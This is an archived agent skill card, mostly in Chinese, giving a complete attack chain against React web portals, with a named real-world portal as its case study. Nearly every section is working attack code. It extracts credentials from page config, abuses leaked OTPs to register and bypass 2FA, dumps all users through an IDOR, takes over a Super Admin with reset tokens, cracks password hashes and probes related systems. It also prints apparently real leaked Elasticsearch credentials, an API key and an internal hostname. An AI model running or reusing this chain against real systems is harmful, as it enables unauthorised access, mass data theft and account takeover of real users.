<!-- archived from /root/.hermes/skills/security/react-spa-tempuser-idor-otp-chain/SKILL.md on 2026-10-21 -->

---
name: react-spa-tempuser-idor-otp-chain
description: >-
  React SPA 企业门户系统完整攻击链：从 window.myConfig 挖配置凭据 →
  注册 TempRole 低权账户 → IDOR 全量用户dump → OTP API 明文泄露 绕 2FA →
  resetAuth token 接管 Super Admin。
  适用：有注册流程的 React SPA + JWT + 角色分级系统；
  同源漏洞复现（同一开发团队的多系统）；
  企业内部门户/文档投递/案件管理/B2B 平台。
  关键词：window.myConfig 凭据泄露、OTP response leakage、IDOR 用户枚举、
  resetAuth token、TempRole、2FA bypass via API、React SPA API mining、
  utf-8-sig JSON、FormData vs JSON、低权限角色越权。
version: 1.0.0
tags: [idor, 2fa-bypass, react-spa, otp-leakage, account-takeover, super-admin]
references:
  - references/epiq-ddp-case-study.md
  - references/pitfalls-and-traps.md
---

> 归档卡：原目录 `/root/.hermes/skills/security/react-spa-tempuser-idor-otp-chain`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/react-spa-tempuser-idor-otp-chain/…')`，不要相对 `references/legacy/` 解析。

# React SPA TempUser IDOR + OTP 泄露接管链

**真实案例**: Epiq Document Delivery Portal (deliveryportal.epiqglobal.com)  
**参考**: `references/epiq-ddp-case-study.md`

---

## 0. 前提确认

```
目标在 config/scope*.json ✓
系统特征（触发本卡）:
  ✓ React/Vue SPA 前端 + 分离 API 后端
  ✓ 有公开注册流程（无需邀请码）
  ✓ 邮箱验证 OTP / 注册 2FA
  ✓ JWT Bearer 认证
  ✓ 角色系统（多级 roleId）
```

---

## 1. 侦察：window.myConfig / window.* 全局对象挖凭据

React SPA 通常在 `index.html` 注入全局配置，包含敏感信息：

```javascript
// 在浏览器控制台执行 (CDP)
JSON.stringify(Object.keys(window).filter(k =>
  k.toLowerCase().includes('config') ||
  k.toLowerCase().includes('setting') ||
  k.toLowerCase().includes('env') ||
  k.toLowerCase().includes('app') ||
  k.toLowerCase().includes('api')
))

// 然后深挖匹配的 key
JSON.stringify(window.myConfig || window.appConfig || window.settings || window.__ENV__)
```

**高价值字段（必须检查）**:
```
es_userName / es_password / es_baseUrl     ← Elasticsearch 凭据
apiKey / DPApiKey / x-api-key              ← API Key（可以绕过认证）
db_host / db_password / connectionString   ← 数据库直连
tinyMCEKey / mapApiKey                     ← 第三方服务 Key（可能复用）
```

**真实发现示例**:
```json
{
  "es_userName": "elastic",
  "es_password": "dkUGDr0$@kzL2q",
  "es_baseUrl": "http://p054ebtddpobj02:9200/",
  "DPApiKey": "DPKeyExchange_DPKeyExchange"
}
```

---

## 2. 侦察：从 JS Chunks 提取完整 API 路由表

SPA 的 JS bundle 包含所有 API endpoint 调用：

```bash
# 1. 找所有 chunk 文件
curl -s https://目标/index.html | grep -oE 'src="[^"]+chunk[^"]+"' | grep -oE '/static/js/[^"]*'

# 2. 批量下载并搜索 API 路径
for chunk_url in $(上一步结果); do
  curl -s "https://目标$chunk_url" >> all_chunks.js
done

grep -oE '"api/[A-Za-z/]+[^"]{0,30}"' all_chunks.js | sort -u

# 3. 找 window.myConfig 注入点
grep -oE 'window\.[a-zA-Z]+\s*=\s*\{[^}]{0,500}\}' all_chunks.js
```

**使用 CDP（更快）**:
```javascript
// 等页面加载后执行
let apis = [];
Object.keys(window).forEach(k => {
  try {
    let v = JSON.stringify(window[k]);
    if (v && v.includes('api/')) apis.push({key: k, preview: v.substring(0, 200)});
  } catch(e) {}
});
JSON.stringify(apis);
```

---

## 3. 注册 TempRole 账户（无需邀请码）

企业门户通常有 "待激活" 的临时角色 (TempRole)，注册即可获得：

```python
import requests, json, base64

BASE = "https://目标api/"
HEADERS = {"Content-Type": "application/json", "DPApiKey": "从window.myConfig提取"}

# Step 1: 发送注册 OTP（触发 OTP 泄露）
r = requests.post(BASE + "api/Registration/SendAuthenticationEmail",
    json={"email": "攻击者邮箱@protonmail.com", "isResend": False},
    headers=HEADERS)
data = json.loads(r.content.decode('utf-8-sig'))  # ⚠️ utf-8-sig 处理 BOM

# ⭐ 关键：OTP 直接在响应中
otp_b64 = data.get("authKey", "")  # Base64 编码的 OTP
otp_code = base64.b64decode(otp_b64 + "==").decode()
print(f"OTP 泄露: {otp_code} (Base64: {otp_b64})")

# Step 2: 用泄露的 OTP 完成注册
r2 = requests.post(BASE + "api/Registration/CreateTempUser",
    json={
        "email": "攻击者邮箱@protonmail.com",
        "authKey": otp_b64,
        "userName": "攻击者用户名",
        "password": "复杂密码"
    },
    headers=HEADERS)
print(r2.json())
```

---

## 4. IDOR：TempRole JWT 读取全量用户

低权限 JWT 能访问 `/api/User/GetUserList` 是常见 IDOR：

```python
JWT = "eyJhbGci..."  # TempRole JWT

# 4.1 全量用户 dump
r = requests.get(BASE + "api/User/GetUserList",
    headers={"Authorization": f"Bearer {JWT}", **HEADERS})
users = json.loads(r.content.decode('utf-8-sig'))

# 4.2 筛选高价值账户
super_admins = [u for u in users if u.get('roleId') in [-1, -2, 1] or
                'admin' in u.get('roleName', '').lower()]
print(f"找到 {len(super_admins)} 个管理员")

# 4.3 逐个获取详情（包含 resetAuth）
for admin in super_admins:
    uid = admin.get('userId')
    r2 = requests.get(BASE + f"api/User/GetUserDetails?userId={uid}",
        headers={"Authorization": f"Bearer {JWT}", **HEADERS})
    detail = json.loads(r2.content.decode('utf-8-sig'))
    reset_token = detail.get('resetAuth') or detail.get('resetAuthKey')
    pw_hash = detail.get('passwordHash') or detail.get('password')
    print(f"[{uid}] {detail.get('email')} | resetAuth={reset_token} | hash={pw_hash[:32] if pw_hash else None}")
```

**典型数据结构**:
```json
{
  "userId": 1,
  "userName": "jmartinez",
  "email": "<EMAIL-REDACTED>",
  "roleId": -1,
  "passwordHash": "68208b3c...",
  "resetAuth": "4mf9vCw3G7"
}
```

---

## 5. resetAuth Token → 密码重置 → Super Admin 接管

**关键陷阱**: 正确的参数名和格式需要从 JS bundle 确认：

```python
# ⚠️ 先读 JS bundle 确认参数格式（见 §5.1）
# 常见错误：JSON body vs FormData，参数名 resetAuth vs AuthKey

# 5.1 FormData 格式（Epiq DDP 实例）
import requests

TARGET_USER_ID = 1
RESET_TOKEN = "4mf9vCw3G7"
NEW_PASSWORD = "NewPass@2026!"

fd = {
    "AuthKey": RESET_TOKEN,           # ⚠️ 不是 resetAuth！从JS确认
    "newPassword": NEW_PASSWORD,
    "confirmPassword": NEW_PASSWORD,
    "IsMigratedUser": "false"
}
r = requests.post(
    BASE + f"api/Registration/ResetPassword?resetAuthKey={RESET_TOKEN}",
    data=fd,  # ⚠️ data= 不是 json=
    headers={"DPApiKey": "从window提取"}  # ⚠️ 不带 Content-Type（multipart自动）
)
print(r.status_code, r.text[:200])
```

### 5.1 从 JS Bundle 确认 API 参数格式（避免猜测）

```bash
# 1. 找包含 ResetPassword 的 chunk
grep -l "ResetPassword\|resetPassword\|resetAuth" /tmp/chunks/*.js

# 2. 提取相关代码段
grep -A 20 "ResetPassword" /tmp/target_chunk.js

# 实际发现：
# const s = new FormData;
# s.append("AuthKey", T)         ← URL param 'resetAuthKey' 的值
# s.append("newPassword", e.newPassword)
# s.append("IsMigratedUser", q)
# t.A.post(baseURL + "api/Registration/ResetPassword", s, {headers: a})
```

---

## 6. 2FA 绕过：登录时 OTP 泄露

登录触发 2FA 时，OTP 同样通过 API 响应明文返回：

```python
# Step 1: 密码登录（触发 2FA 步骤）
r1 = requests.post(BASE + "api/Login/Validation",
    json={"userName": "jmartinez", "password": "NewPass@2026!"},
    headers=HEADERS)
data1 = json.loads(r1.content.decode('utf-8-sig'))

# ⭐ OTP 在响应里
otp_b64 = data1.get("authKey", "")
otp = base64.b64decode(otp_b64 + "==").decode()
print(f"2FA OTP: {otp}")

# Step 2: 提交 OTP 获取最终 JWT
r2 = requests.post(BASE + "api/Registration/ValidateAuthKey",
    json={"userName": "jmartinez", "authKey": otp_b64},
    headers=HEADERS)
data2 = json.loads(r2.content.decode('utf-8-sig'))
jwt = data2.get("token") or data2.get("accessToken")
print(f"Super Admin JWT: {jwt[:60]}...")
```

---

## 7. Elasticsearch 凭据利用

有了 `window.myConfig` 里的 ES 凭据，通过 API 代理端点查询：

```python
# 7.1 通过后端 API 代理端点访问 ES（无需直连内网）
ES_SEARCH = BASE + "Search"
r = requests.get(ES_SEARCH,
    params={
        "searchText": "目标关键词",
        "role": "SuperAdmin",
        "userName": "jmartinez",
        "userId": "1",
        "index": "document,users,template",
        "from": 0,
        "size": 10
    },
    headers={"Authorization": f"Bearer {SUPER_ADMIN_JWT}", **HEADERS})
print(r.json())

# 7.2 直连 ES（如果内网可达）
import elasticsearch
es = elasticsearch.Elasticsearch(
    "http://内网主机:9200",
    basic_auth=("elastic", "dkUGDr0$@kzL2q")
)
es.indices.get(index="*")  # 列出所有索引
```

---

## 8. MD5 密码哈希破解

```bash
# 从用户列表提取哈希（注意：可能是 MD5+SHA256 拼接，取前32位）
echo "eed96928d820d2de920f229498841457" | hashcat -a 0 -m 0 - rockyou.txt

# 在线快速查：
# https://crackstation.net/
# https://md5decrypt.net/

# 识别是否是 MD5 (32位) 还是 SHA256 (64位) 还是拼接
python3 -c "
h = 'eed96928d820d2de920f229498841457cccccccccccccccccccccccccccccccc'
if len(h) == 32: print('MD5')
elif len(h) == 64: print('SHA256 or MD5+salt concat')
else: print(f'Unknown: {len(h)} chars')
"
```

---

## 9. 同源漏洞复现方法论（同一开发团队的多系统）

**核心假设**: 同一开发团队 → 相同的漏洞模式

```python
# 对目标系统测试相同的端点
TARGET_B = "https://另一个系统/"
SAME_ENDPOINTS = [
    "api/Registration/SendAuthenticationEmail",  # OTP 泄露
    "api/Registration/IsUserExists",             # 用户枚举
    "api/User/GetUserList",                      # IDOR
    "api/Registration/CheckUserDetails",
    "api/Login/Validation",
]

for ep in SAME_ENDPOINTS:
    try:
        r = requests.get(TARGET_B + ep, timeout=5)
        print(f"[{r.status_code}] {ep}: {r.text[:100]}")
    except Exception as e:
        print(f"ERR {ep}: {e}")
```

**判断两个系统是否数据共享**:
1. Elasticsearch 搜索对方系统的关键词 → 0 结果 = 独立
2. JWT 解码看 `iss` (issuer) 字段是否相同
3. Session/Cookie 名称是否相同
4. 注册同一邮箱看两个系统是否都能用

---

## 10. 完整攻击链脚本

```python
#!/usr/bin/env python3
"""
React SPA TempUser IDOR + OTP 链完整 PoC
修改: BASE, API_KEY, ATTACKER_EMAIL
"""
import requests, json, base64

BASE = "https://目标api/"
API_KEY = "从window.myConfig提取"
ATTACKER_EMAIL = "<EMAIL-REDACTED>"
HEADERS = {"Content-Type": "application/json", "DPApiKey": API_KEY}

def decode_otp(b64):
    try:
        return base64.b64decode(b64 + "==").decode()
    except:
        return b64

def api(method, path, **kwargs):
    r = getattr(requests, method)(BASE + path, headers=HEADERS, **kwargs)
    try:
        return json.loads(r.content.decode('utf-8-sig'))
    except:
        return {"raw": r.text[:200], "status": r.status_code}

# 1. 注册触发 OTP 泄露
print("[1] 注册账户...")
r = api("post", "api/Registration/SendAuthenticationEmail",
        json={"email": ATTACKER_EMAIL, "isResend": False})
otp_b64 = r.get("authKey", "")
print(f"  OTP 泄露: {decode_otp(otp_b64)} (b64={otp_b64})")

# 2. 完成注册
r2 = api("post", "api/Registration/CreateTempUser",
         json={"email": ATTACKER_EMAIL, "authKey": otp_b64,
               "userName": "attacker", "password": "Att@ck2026!"})
print(f"[2] 注册: {r2}")

# 3. 登录获取 TempRole JWT
r3 = api("post", "api/Login/Validation",
         json={"userName": "attacker", "password": "Att@ck2026!"})
login_otp_b64 = r3.get("authKey", "")
print(f"[3] 登录 OTP: {decode_otp(login_otp_b64)}")
r3b = api("post", "api/Registration/ValidateAuthKey",
          json={"userName": "attacker", "authKey": login_otp_b64})
temp_jwt = r3b.get("token", "")
print(f"  TempRole JWT: {temp_jwt[:50]}...")

# 4. IDOR - 全量用户 dump
r4 = requests.get(BASE + "api/User/GetUserList",
    headers={"Authorization": f"Bearer {temp_jwt}", **HEADERS})
users = json.loads(r4.content.decode('utf-8-sig'))
print(f"[4] 用户总数: {len(users)}")

admins = [u for u in users if str(u.get('roleId','')).startswith('-')]
print(f"  管理员: {len(admins)}")
for a in admins[:5]:
    r5 = requests.get(BASE + f"api/User/GetUserDetails?userId={a['userId']}",
        headers={"Authorization": f"Bearer {temp_jwt}", **HEADERS})
    d = json.loads(r5.content.decode('utf-8-sig'))
    print(f"  [{d.get('userId')}] {d.get('email')} | reset={d.get('resetAuth')} | hash={str(d.get('passwordHash',''))[:32]}")

# 5. 密码重置接管（有 resetAuth 的账户）
# 见 §5 的代码段
```

---

## 陷阱与注意事项

见 `references/pitfalls-and-traps.md`

---

## 适用场景速查

| 场景 | 命中条件 |
|------|---------|
| 企业文档门户 | React SPA + 律师/债权人注册 |
| 政务服务平台 | JWT + 多角色 + OTP 注册 |
| B2B SaaS 平台 | 有免费注册 + API 后端分离 |
| 内部案件管理 | Chapter/法院/申报等业务词汇 |
| 集体诉讼/结算系统 | Unique ID + PIN + claimant |
